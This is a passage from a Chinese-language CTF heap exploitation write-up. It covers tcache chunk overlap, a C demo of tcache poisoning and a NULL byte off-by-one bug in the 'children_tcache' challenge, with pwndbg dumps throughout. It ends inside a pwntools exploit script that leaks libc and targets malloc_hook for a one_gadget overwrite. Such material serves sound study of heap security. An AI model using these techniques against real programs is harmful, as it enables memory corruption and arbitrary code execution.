    0x555555756290: 0x4141414141414141  0x4141414141414141
    0x5555557562a0: 0x4141414141414141  0x0000000000000021
    0x5555557562b0: 0x4141414141414141  0x4141414141414141
    0x5555557562c0: 0x4141414141414141  0x4141414141414141
    pwndbg> x/30gx 0x555555756000 
    0x555555756000: 0x0000000000000000  0x0000000000000251
    0x555555756010: 0x0000000000000000  0x0100000000000000      ==> counts
    0x555555756020: 0x0000000000000000  0x0000000000000000
    0x555555756030: 0x0000000000000000  0x0000000000000000
    0x555555756040: 0x0000000000000000  0x0000000000000000
    0x555555756050: 0x0000000000000000  0x0000000000000000
    0x555555756060: 0x0000000000000000  0x0000000000000000
    0x555555756070: 0x0000000000000000  0x0000000000000000
    0x555555756080: 0x0000000000000000  0x0000000000000000
    0x555555756090: 0x0000000000000000  0x0000000000000000
    0x5555557560a0: 0x0000000000000000  0x0000000000000000
    0x5555557560b0: 0x0000000000000000  0x0000000000000000
    0x5555557560c0: 0x0000000000000000  0x0000555555756260      ==> entries
    0x5555557560d0: 0x0000000000000000  0x0000000000000000
    0x5555557560e0: 0x0000000000000000  0x0000000000000000
申请`0x110-8`大小的p3
    pwndbg> x/12gx 0x0000555555756250
    0x555555756250: 0x0000000000000000  0x0000000000000110      ==> p3 (原来p1的位置，且将后面的p2覆盖)
    0x555555756260: 0x4242424242424242  0x4242424242424242
    0x555555756270: 0x4242424242424242  0x4242424242424242
    0x555555756280: 0x4242424242424242  0x4242424242424242
    0x555555756290: 0x4242424242424242  0x4242424242424242
    0x5555557562a0: 0x4242424242424242  0x4242424242424242      ==> p2
造成了堆块重叠
## tcache_poisoning
    #include 
    #include 
    #include 
    #include 
    int main() {
        intptr_t *p1, *p2, *p3;
        size_t target[10];
        printf("Our target is a stack region at %p\n", (void *)target);
        p1 = malloc(0x30);
        memset(p1, 0x41, 0x30+8);
        fprintf(stderr, "Allocated victim chunk with requested size 0x30 at %p\n", p1);
        fprintf(stderr, "Freed victim chunk to put it in a tcache bin\n");
        free(p1);
        fprintf(stderr, "Emulating corruption of the next ptr\n");
        *p1 = (int64_t)target;
        fprintf(stderr, "Now we make two requests for the appropriate size so that malloc returns a chunk overlapping our target\n");
        p2 = malloc(0x30);
        memset(p2, 0x42, 0x30+8);
        p3 = malloc(0x30);
        memset(p3, 0x42, 0x30+8);
        fprintf(stderr, "The first malloc(0x30) returned %p, the second one: %p\n", p2, p3);
    }
运行结果：
    Our target is a stack region at 0x7ffdb6b5b510
    Allocated victim chunk with requested size 0x30 at 0x561fe4ccb670
    Freed victim chunk to put it in a tcache bin
    Emulating corruption of the next ptr
    Now we make two requests for the appropriate size so that malloc returns a chunk overlapping our target
    The first malloc(0x30) returned 0x561fe4ccb670, the second one: 0x7ffdb6b5b510
gdb调试：  
创建一个chunk p1
    pwndbg> x/10gx 0x555555756660
    0x555555756660: 0x0000000000000000  0x0000000000000041
    0x555555756670: 0x4141414141414141  0x4141414141414141
    0x555555756680: 0x4141414141414141  0x4141414141414141
    0x555555756690: 0x4141414141414141  0x4141414141414141
    0x5555557566a0: 0x4141414141414141  0x0000000000020961
free后：
    pwndbg> x/10gx 0x555555756660
    0x555555756660: 0x0000000000000000  0x0000000000000041
    0x555555756670: 0x0000000000000000  0x4141414141414141      ==> fd被删除 / **
    0x555555756680: 0x4141414141414141  0x4141414141414141
    0x555555756690: 0x4141414141414141  0x4141414141414141
    0x5555557566a0: 0x4141414141414141  0x0000000000020961
    pwndbg> vmmap heap
    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
        0x555555756000     0x555555777000 rw-p    21000 0      [heap]
    pwndbg> x/16gx 0x555555756000
    0x555555756000: 0x0000000000000000  0x0000000000000251
    0x555555756010: 0x0000000000010000  0x0000000000000000      ==> counts
    0x555555756020: 0x0000000000000000  0x0000000000000000
    0x555555756030: 0x0000000000000000  0x0000000000000000
    0x555555756040: 0x0000000000000000  0x0000000000000000
    0x555555756050: 0x0000000000000000  0x0000000000000000
    0x555555756060: 0x0000555555756670  0x0000000000000000      ==> entries
    0x555555756070: 0x0000000000000000  0x0000000000000000
将fd指针修改为target
    pwndbg> x/10gx 0x555555756660
    0x555555756660: 0x0000000000000000  0x0000000000000041
    0x555555756670: 0x00007fffffffde40  0x4141414141414141    ==> fd被修改为target addr
    0x555555756680: 0x4141414141414141  0x4141414141414141
    0x555555756690: 0x4141414141414141  0x4141414141414141
    0x5555557566a0: 0x4141414141414141  0x0000000000020961
申请p2
    pwndbg> x/10gx 0x555555756660
    0x555555756660: 0x0000000000000000  0x0000000000000041
    0x555555756670: 0x4242424242424242  0x4242424242424242
    0x555555756680: 0x4242424242424242  0x4242424242424242
    0x555555756690: 0x4242424242424242  0x4242424242424242
    0x5555557566a0: 0x4242424242424242  0x0000000000020961
    pwndbg> x/16gx 0x555555756000
    0x555555756000: 0x0000000000000000  0x0000000000000251
    0x555555756010: 0x0000000000000000  0x0000000000000000    ==> counts = 0
    0x555555756020: 0x0000000000000000  0x0000000000000000
    0x555555756030: 0x0000000000000000  0x0000000000000000
    0x555555756040: 0x0000000000000000  0x0000000000000000
    0x555555756050: 0x0000000000000000  0x0000000000000000
    0x555555756060: 0x00007fffffffde40  0x0000000000000000    ==> entries被修改为我们写的fd，指向栈上的target
    0x555555756070: 0x0000000000000000  0x0000000000000000
申请p3
    //此时的counts虽然为0，但是`tcache_get`并没有做检查，而是直接从entries处返回了一个chunk
    pwndbg> x/16gx 0x555555756000
    0x555555756000: 0x0000000000000000  0x0000000000000251
    0x555555756010: 0x0000000000ff0000  0x0000000000000000    ==> counts = 0-1 = 0xff 【产生了整数溢出】可被unsorted bin attack 利用
    0x555555756020: 0x0000000000000000  0x0000000000000000
    0x555555756030: 0x0000000000000000  0x0000000000000000
    0x555555756040: 0x0000000000000000  0x0000000000000000
    0x555555756050: 0x0000000000000000  0x0000000000000000
    0x555555756060: 0x0000000000000009  0x0000000000000000
    0x555555756070: 0x0000000000000000  0x0000000000000000
    pwndbg> x/10gx &p3
    0x7fffffffde38: 0x00007fffffffde40  0x4242424242424242    ==> 直接写入了target处--|
    0x7fffffffde48: 0x4242424242424242  0x4242424242424242                           |
    0x7fffffffde58: 0x4242424242424242  0x4242424242424242                           |
    0x7fffffffde68: 0x4242424242424242  0x4242424242424242                           |
    0x7fffffffde78: 0x0000000000000000  0x00005555555549d0                           |
                                                                                         |
    pwndbg> x/10gx 0x7fffffffde40                                                        |
    0x7fffffffde40: 0x4242424242424242  0x4242424242424242    strcpy把含有'\0'结束符的字符串复制到另一个地址空间
所以存在漏洞`NULL byte off-by-one`
  1. 通过unsorted bin的fd bk指针泄露libc：tcache的范围是 [0x20, 0x400)，超过这个大小的就会放入unsorted bin，unsorted bin中只有一个chunk时的fd bk指向main_arena附近的地址。被free后，data会被覆盖为0xda， 
        pwndbg> x/200gx 0x555555757250
    0x555555757250: 0x0000000000000000  0x0000000000000511
    0x555555757260: 0x00007ffff7dcfca0  0x00007ffff7dcfca0
    0x555555757270: 0x0000000000000000  0x0000000000000000
    0x555555757280: 0xdadadadadadadada  0xdadadadadadadada
    0x555555757290: 0xdadadadadadadada  0xdadadadadadadada
                        ··················
    0x555555757740: 0xdadadadadadadada  0xdadadadadadadada
    0x555555757750: 0xdadadadadadadada  0xdadadadadadadada
    0x555555757760: 0x0000000000000510  0x0000000000000030
    0x555555757770: 0x0000000000000000  0xdadadadadadadada
    0x555555757780: 0xdadadadadadadada  0xdadadadadadadada
    0x555555757790: 0x0000000000000000  0x0000000000000500
    0x5555557577a0: 0x000000000000326b  0x0000000000000000
    0x5555557577b0: 0x0000000000000000  0x0000000000000000
  2. tcache分配chunk时直接通过fd分配，不会对size检查，所以没有必要进行构造fake_fast_size。我们可以直接通过修改fd，将chunk分配到`malloc_hook`或`free_hook`附近的地址，然后将`malloc_hook`或`free_hook`改为`one_gadget`，再次malloc或者free时就会调用其上的`one_gadget`。
### exp
    #!usr/bin/python
    from pwn import *
    # context.log_level = 'debug'
    binary = "./children_tcache"
    ip = ""
    port = 0
    elf = ELF(binary)
    def menu(choice):
        io.sendlineafter("choice: ", str(choice))
    def new(size, data):
        menu(1)
        io.sendlineafter("Size:", str(size))
        io.sendafter("Data:", data)
    def show(index):
        menu(2)
        io.sendlineafter("Index:", str(index))
    def delete(index):
        menu(3)
        io.sendlineafter("Index:", str(index))
    def pwn(ip, port, debug):
        global io
        if debug == 1:
            io = process(binary)
            libc = ELF("./libc.so.6")   
        else:
            io = remote(ip, port)
            libc = 0
        new(0x500, "k0")    # 0
        new(0x28, "k1")     # 1
        new(0x4f0, "k2")    # 2
        new(0x20, "k3")     # 3
        delete(1)
        delete(0)
        for i in range(0, 9):
            new(0x28-i, 'A'*(0x28-i))       # 0
            delete(0)
        # gdb.attach(io)
        new(0x28, 'B'*0x20+p64(0x540))      # 0 
        delete(2)
        new(0x500, 'A')     # 1
        show(0)
        libc_base = u64(io.recv(6).ljust(8, '\x00'))-0x60-0x3ebc40
        print "libc_base = " +hex(libc_base)
        malloc_hook = libc_base + libc.symbols['__malloc_hook']